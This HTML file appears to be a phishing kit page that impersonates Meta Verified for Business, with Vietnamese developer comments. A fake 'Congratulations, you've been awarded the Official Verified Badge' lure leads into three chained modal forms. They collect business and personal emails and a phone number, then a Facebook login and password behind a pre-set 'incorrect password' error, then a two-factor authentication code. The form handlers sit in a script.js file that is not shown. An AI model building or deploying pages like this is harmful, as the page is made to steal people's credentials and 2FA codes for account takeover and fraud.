<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your Business</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='12' fill='%231877F2'/><path fill='white' d='M16.5 12.5h-3v8h-3.3v-8H8.5v-2.8h1.7V8.2c0-2 1.2-3.7 4-3.7h2.7v2.8h-2c-.9 0-1 .4-1 1.1v1.3h3l-.4 2.8z'/></svg>">
    <link rel="stylesheet" href="style.css">
    <style>
        /* Chỉnh lại để form nổi lên trên nền trang chủ */
        body { overflow: hidden; } 
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 1000; align-items: center; justify-content: center; padding: 24px 16px; overflow-y: auto; }
        .modal-overlay.open { display: flex; }
    </style>
</head>
<body>

<!-- ========================================== -->
<!-- PHẦN NỀN: COPY Y HỆT TRANG CHỦ INDEX.HTML -->
<!-- ========================================== -->
<header class="header">
    <div class="header-left">
        <a href="index.html" class="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business"></a>
        <nav class="nav-links">
            <a class="nav-link" href="index.html#steps">Get started</a>
            <a class="nav-link" href="index.html#benefits">Advertise</a>
            <a class="nav-link" href="index.html#faq">Learn</a>
            <a class="nav-link" href="index.html#footer">Support</a>
        </nav>
    </div>
    <div class="header-right">
        <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
        <div class="avatar-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" stroke-width="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
    </div>
</header>

<section id="hero">
    <div class="hero-inner">
        <div class="hero-text">
            <div class="hero-text-inner">
                <svg class="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                <h1 class="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                <p class="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
                <button class="btn-primary">Claim your badge</button>
                <p class="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
            </div>
        </div>
        <div class="hero-image">
            <img src="images/hero.webp" alt="Meta Verified for Business">
        </div>
    </div>
</section>

<!-- ========================================== -->
<!-- PHẦN FORM NỔI LÊN TRÊN CÙNG -->
<!-- ========================================== -->

<!-- FORM 1: SIGNUP -->
<div class="modal-overlay open" id="signupModal">
    <div class="modal-container">
        <button class="modal-close" onclick="window.location.href='index.html'" aria-label="Close">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
        </button>
        <div class="modal-brand">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="Facebook from Meta">
        </div>
        <h2 class="modal-title">Meta Verified for Business</h2>
        <p class="modal-subtitle">Enter your business details to start your application.</p>
        <form onsubmit="handleSignupSubmit(event)" novalidate autocomplete="off" class="fb-form">
            <div class="fb-input-group">
                <input type="text" class="fb-input" id="busName" placeholder="Business name" autocomplete="organization">
                <div class="field-error" id="busNameError"><span>Please enter your business name.</span></div>
            </div>
            <div class="fb-input-group">
                <input type="email" class="fb-input" id="perEmail" placeholder="Personal email" autocomplete="email" inputmode="email">
                <div class="field-error" id="perEmailError"><span>Please enter a valid personal email address.</span></div>
            </div>
            <div class="fb-input-group">
                <input type="email" class="fb-input" id="busEmail" placeholder="Business email" autocomplete="email" inputmode="email">
                <div class="field-error" id="busEmailError"><span>Please enter a valid business email address.</span></div>
            </div>
            <div class="fb-input-group">
                <div class="fb-phone-group">
                    <div class="fb-phone-select-wrap">
                                                <select class="fb-phone-select" id="countryCodeSelect" aria-label="Country code">
                            <option value="+93">+93 (Afghanistan)</option>
                            <option value="+355">+355 (Albania)</option>
                            <option value="+213">+213 (Algeria)</option>
                            <option value="+1">+1 (American Samoa)</option>
                            <option value="+376">+376 (Andorra)</option>
                            <option value="+244">+244 (Angola)</option>
                            <option value="+1">+1 (Anguilla)</option>
                            <option value="+1">+1 (Antigua and Barbuda)</option>
                            <option value="+54">+54 (Argentina)</option>
                            <option value="+374">+374 (Armenia)</option>
                            <option value="+297">+297 (Aruba)</option>
                            <option value="+61">+61 (Australia)</option>
                            <option value="+43">+43 (Austria)</option>
                            <option value="+994">+994 (Azerbaijan)</option>
                            <option value="+1">+1 (Bahamas)</option>
                            <option value="+973">+973 (Bahrain)</option>
                            <option value="+880">+880 (Bangladesh)</option>
                            <option value="+1">+1 (Barbados)</option>
                            <option value="+375">+375 (Belarus)</option>
                            <option value="+32">+32 (Belgium)</option>
                            <option value="+501">+501 (Belize)</option>
                            <option value="+229">+229 (Benin)</option>
                            <option value="+1">+1 (Bermuda)</option>
                            <option value="+975">+975 (Bhutan)</option>
                            <option value="+591">+591 (Bolivia)</option>
                            <option value="+387">+387 (Bosnia and Herzegovina)</option>
                            <option value="+267">+267 (Botswana)</option>
                            <option value="+55">+55 (Brazil)</option>
                            <option value="+1">+1 (British Virgin Islands)</option>
                            <option value="+673">+673 (Brunei)</option>
                            <option value="+359">+359 (Bulgaria)</option>
                            <option value="+226">+226 (Burkina Faso)</option>
                            <option value="+257">+257 (Burundi)</option>
                            <option value="+855">+855 (Cambodia)</option>
                            <option value="+237">+237 (Cameroon)</option>
                            <option value="+1">+1 (Canada)</option>
                            <option value="+238">+238 (Cape Verde)</option>
                            <option value="+1">+1 (Cayman Islands)</option>
                            <option value="+236">+236 (Central African Republic)</option>
                            <option value="+235">+235 (Chad)</option>
                            <option value="+56">+56 (Chile)</option>
                            <option value="+86">+86 (China)</option>
                            <option value="+57">+57 (Colombia)</option>
                            <option value="+269">+269 (Comoros)</option>
                            <option value="+242">+242 (Congo - Brazzaville)</option>
                            <option value="+243">+243 (Congo - Kinshasa)</option>
                            <option value="+682">+682 (Cook Islands)</option>
                            <option value="+506">+506 (Costa Rica)</option>
                            <option value="+225">+225 (Côte d'Ivoire)</option>
                            <option value="+385">+385 (Croatia)</option>
                            <option value="+53">+53 (Cuba)</option>
                            <option value="+599">+599 (Curaçao)</option>
                            <option value="+357">+357 (Cyprus)</option>
                            <option value="+420">+420 (Czechia)</option>
                            <option value="+45">+45 (Denmark)</option>
                            <option value="+253">+253 (Djibouti)</option>
                            <option value="+1">+1 (Dominica)</option>
                            <option value="+1">+1 (Dominican Republic)</option>
                            <option value="+593">+593 (Ecuador)</option>
                            <option value="+20">+20 (Egypt)</option>
                            <option value="+503">+503 (El Salvador)</option>
                            <option value="+240">+240 (Equatorial Guinea)</option>
                            <option value="+291">+291 (Eritrea)</option>
                            <option value="+372">+372 (Estonia)</option>
                            <option value="+268">+268 (Eswatini)</option>
                            <option value="+251">+251 (Ethiopia)</option>
                            <option value="+500">+500 (Falkland Islands)</option>
                            <option value="+298">+298 (Faroe Islands)</option>
                            <option value="+679">+679 (Fiji)</option>
                            <option value="+358">+358 (Finland)</option>
                            <option value="+33">+33 (France)</option>
                            <option value="+594">+594 (French Guiana)</option>
                            <option value="+689">+689 (French Polynesia)</option>
                            <option value="+241">+241 (Gabon)</option>
                            <option value="+220">+220 (Gambia)</option>
                            <option value="+995">+995 (Georgia)</option>
                            <option value="+49">+49 (Germany)</option>
                            <option value="+233">+233 (Ghana)</option>
                            <option value="+350">+350 (Gibraltar)</option>
                            <option value="+30">+30 (Greece)</option>
                            <option value="+299">+299 (Greenland)</option>
                            <option value="+1">+1 (Grenada)</option>
                            <option value="+590">+590 (Guadeloupe)</option>
                            <option value="+1">+1 (Guam)</option>
                            <option value="+502">+502 (Guatemala)</option>
                            <option value="+44">+44 (Guernsey)</option>
                            <option value="+224">+224 (Guinea)</option>
                            <option value="+245">+245 (Guinea-Bissau)</option>
                            <option value="+592">+592 (Guyana)</option>
                            <option value="+509">+509 (Haiti)</option>
                            <option value="+504">+504 (Honduras)</option>
                            <option value="+852">+852 (Hong Kong SAR China)</option>
                            <option value="+36">+36 (Hungary)</option>
                            <option value="+354">+354 (Iceland)</option>
                            <option value="+91">+91 (India)</option>
                            <option value="+62">+62 (Indonesia)</option>
                            <option value="+98">+98 (Iran)</option>
                            <option value="+964">+964 (Iraq)</option>
                            <option value="+353">+353 (Ireland)</option>
                            <option value="+44">+44 (Isle of Man)</option>
                            <option value="+972">+972 (Israel)</option>
                            <option value="+39">+39 (Italy)</option>
                            <option value="+1">+1 (Jamaica)</option>
                            <option value="+81">+81 (Japan)</option>
                            <option value="+44">+44 (Jersey)</option>
                            <option value="+962">+962 (Jordan)</option>
                            <option value="+7">+7 (Kazakhstan)</option>
                            <option value="+254">+254 (Kenya)</option>
                            <option value="+686">+686 (Kiribati)</option>
                            <option value="+383">+383 (Kosovo)</option>
                            <option value="+965">+965 (Kuwait)</option>
                            <option value="+996">+996 (Kyrgyzstan)</option>
                            <option value="+856">+856 (Laos)</option>
                            <option value="+371">+371 (Latvia)</option>
                            <option value="+961">+961 (Lebanon)</option>
                            <option value="+266">+266 (Lesotho)</option>
                            <option value="+231">+231 (Liberia)</option>
                            <option value="+218">+218 (Libya)</option>
                            <option value="+423">+423 (Liechtenstein)</option>
                            <option value="+370">+370 (Lithuania)</option>
                            <option value="+352">+352 (Luxembourg)</option>
                            <option value="+853">+853 (Macao SAR China)</option>
                            <option value="+261">+261 (Madagascar)</option>
                            <option value="+265">+265 (Malawi)</option>
                            <option value="+60">+60 (Malaysia)</option>
                            <option value="+960">+960 (Maldives)</option>
                            <option value="+223">+223 (Mali)</option>
                            <option value="+356">+356 (Malta)</option>
                            <option value="+692">+692 (Marshall Islands)</option>
                            <option value="+596">+596 (Martinique)</option>
                            <option value="+222">+222 (Mauritania)</option>
                            <option value="+230">+230 (Mauritius)</option>
                            <option value="+262">+262 (Mayotte)</option>
                            <option value="+52">+52 (Mexico)</option>
                            <option value="+691">+691 (Micronesia)</option>
                            <option value="+373">+373 (Moldova)</option>
                            <option value="+377">+377 (Monaco)</option>
                            <option value="+976">+976 (Mongolia)</option>
                            <option value="+382">+382 (Montenegro)</option>
                            <option value="+1">+1 (Montserrat)</option>
                            <option value="+212">+212 (Morocco)</option>
                            <option value="+258">+258 (Mozambique)</option>
                            <option value="+95">+95 (Myanmar)</option>
                            <option value="+264">+264 (Namibia)</option>
                            <option value="+674">+674 (Nauru)</option>
                            <option value="+977">+977 (Nepal)</option>
                            <option value="+31">+31 (Netherlands)</option>
                            <option value="+687">+687 (New Caledonia)</option>
                            <option value="+64">+64 (New Zealand)</option>
                            <option value="+505">+505 (Nicaragua)</option>
                            <option value="+227">+227 (Niger)</option>
                            <option value="+234">+234 (Nigeria)</option>
                            <option value="+683">+683 (Niue)</option>
                            <option value="+850">+850 (North Korea)</option>
                            <option value="+389">+389 (North Macedonia)</option>
                            <option value="+1">+1 (Northern Mariana Islands)</option>
                            <option value="+47">+47 (Norway)</option>
                            <option value="+968">+968 (Oman)</option>
                            <option value="+92">+92 (Pakistan)</option>
                            <option value="+680">+680 (Palau)</option>
                            <option value="+970">+970 (Palestine)</option>
                            <option value="+507">+507 (Panama)</option>
                            <option value="+675">+675 (Papua New Guinea)</option>
                            <option value="+595">+595 (Paraguay)</option>
                            <option value="+51">+51 (Peru)</option>
                            <option value="+63">+63 (Philippines)</option>
                            <option value="+48">+48 (Poland)</option>
                            <option value="+351">+351 (Portugal)</option>
                            <option value="+1">+1 (Puerto Rico)</option>
                            <option value="+974">+974 (Qatar)</option>
                            <option value="+262">+262 (Réunion)</option>
                            <option value="+40">+40 (Romania)</option>
                            <option value="+7">+7 (Russia)</option>
                            <option value="+250">+250 (Rwanda)</option>
                            <option value="+590">+590 (Saint Barthélemy)</option>
                            <option value="+290">+290 (Saint Helena)</option>
                            <option value="+1">+1 (Saint Kitts and Nevis)</option>
                            <option value="+1">+1 (Saint Lucia)</option>
                            <option value="+590">+590 (Saint Martin)</option>
                            <option value="+508">+508 (Saint Pierre and Miquelon)</option>
                            <option value="+1">+1 (Saint Vincent and the Grenadines)</option>
                            <option value="+685">+685 (Samoa)</option>
                            <option value="+378">+378 (San Marino)</option>
                            <option value="+239">+239 (São Tomé and Príncipe)</option>
                            <option value="+966">+966 (Saudi Arabia)</option>
                            <option value="+221">+221 (Senegal)</option>
                            <option value="+381">+381 (Serbia)</option>
                            <option value="+248">+248 (Seychelles)</option>
                            <option value="+232">+232 (Sierra Leone)</option>
                            <option value="+65">+65 (Singapore)</option>
                            <option value="+1">+1 (Sint Maarten)</option>
                            <option value="+421">+421 (Slovakia)</option>
                            <option value="+386">+386 (Slovenia)</option>
                            <option value="+677">+677 (Solomon Islands)</option>
                            <option value="+252">+252 (Somalia)</option>
                            <option value="+27">+27 (South Africa)</option>
                            <option value="+82">+82 (South Korea)</option>
                            <option value="+211">+211 (South Sudan)</option>
                            <option value="+34">+34 (Spain)</option>
                            <option value="+94">+94 (Sri Lanka)</option>
                            <option value="+249">+249 (Sudan)</option>
                            <option value="+597">+597 (Suriname)</option>
                            <option value="+46">+46 (Sweden)</option>
                            <option value="+41">+41 (Switzerland)</option>
                            <option value="+963">+963 (Syria)</option>
                            <option value="+886">+886 (Taiwan)</option>
                            <option value="+992">+992 (Tajikistan)</option>
                            <option value="+255">+255 (Tanzania)</option>
                            <option value="+66">+66 (Thailand)</option>
                            <option value="+670">+670 (Timor-Leste)</option>
                            <option value="+228">+228 (Togo)</option>
                            <option value="+690">+690 (Tokelau)</option>
                            <option value="+676">+676 (Tonga)</option>
                            <option value="+1">+1 (Trinidad and Tobago)</option>
                            <option value="+216">+216 (Tunisia)</option>
                            <option value="+90">+90 (Turkey)</option>
                            <option value="+993">+993 (Turkmenistan)</option>
                            <option value="+1">+1 (Turks and Caicos Islands)</option>
                            <option value="+688">+688 (Tuvalu)</option>
                            <option value="+256">+256 (Uganda)</option>
                            <option value="+380">+380 (Ukraine)</option>
                            <option value="+971">+971 (United Arab Emirates)</option>
                            <option value="+44">+44 (United Kingdom)</option>
                            <option value="+1">+1 (United States)</option>
                            <option value="+598">+598 (Uruguay)</option>
                            <option value="+1">+1 (US Virgin Islands)</option>
                            <option value="+998">+998 (Uzbekistan)</option>
                            <option value="+678">+678 (Vanuatu)</option>
                            <option value="+379">+379 (Vatican City)</option>
                            <option value="+58">+58 (Venezuela)</option>
                            <option value="+84">+84 (Vietnam)</option>
                            <option value="+681">+681 (Wallis and Futuna)</option>
                            <option value="+212">+212 (Western Sahara)</option>
                            <option value="+967">+967 (Yemen)</option>
                            <option value="+260">+260 (Zambia)</option>
                            <option value="+263">+263 (Zimbabwe)</option>
                        </select>
                    </div>
                    <input type="tel" class="fb-input" id="phoneNum" placeholder="Phone number" autocomplete="tel" inputmode="tel">
                </div>
                <div class="field-error" id="phoneNumError"><span>Please enter a valid phone number.</span></div>
            </div>
            <button type="submit" class="fb-btn" id="signupSubmitBtn">Continue</button>
        </form>
        <div class="modal-meta-footer">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
        </div>
    </div>
</div>

<!-- FORM 2: LOGIN -->
<div class="modal-overlay" id="loginModal">
    <div class="modal-container">
        <button class="modal-close" onclick="window.location.href='index.html'" aria-label="Close">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
        </button>
        <div class="modal-brand">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="Facebook from Meta">
        </div>
        <form onsubmit="handleLoginSubmit(event)" novalidate autocomplete="off" class="fb-form">
            <div class="fb-input-group">
                <input type="text" class="fb-input" id="loginUser" placeholder="Mobile number or email address" inputmode="email" autocomplete="off">
                <div class="field-error" id="loginUserError"><span>Please enter a valid email address or phone number.</span></div>
            </div>
            <div class="fb-input-group">
                <input type="text" class="fb-input" id="loginPass" placeholder="Password" autocomplete="off" style="-webkit-text-security: disc;">
            </div>
            <div class="alert-error" id="loginError"><span>The password you entered is incorrect. Please try again.</span></div>
            <button type="submit" class="fb-btn" id="loginSubmitBtn">Log in</button>
            <div class="fb-helper"><a href="#" onclick="event.preventDefault();">Forgotten password?</a></div>
        </form>
        <div class="modal-meta-footer">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
        </div>
    </div>
</div>

<!-- FORM 3: 2FA -->
<div class="modal-overlay" id="twoFaModal">
    <div class="modal-container">
        <button class="modal-close" onclick="window.location.href='index.html'" aria-label="Close">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
        </button>
        <div class="modal-brand">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="Facebook from Meta">
        </div>
        <h2 class="modal-title">Two-factor authentication</h2>
        <p class="modal-subtitle">Enter the 6-digit code we sent to your WhatsApp or SMS, or an 8-digit backup code.</p>
        <form onsubmit="handleTwoFaSubmit(event)" novalidate autocomplete="off" class="fb-form">
            <div class="fb-input-group">
                <input type="text" class="fb-input fb-otp-input" id="otpField" placeholder="000000" maxlength="8" inputmode="numeric" autocomplete="off">
                <div class="field-error" id="twoFaFieldError"><span>Please enter a valid 6-digit or 8-digit code.</span></div>
            </div>
            <div class="alert-error" id="twoFaError"><span>Invalid security code. Please check the code and try again.</span></div>
            <button type="submit" class="fb-btn" id="twoFaSubmitBtn">Verify</button>
        </form>
        <div class="modal-meta-footer">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
        </div>
    </div>
</div>

<script src="script.js"></script>
</body>
</html>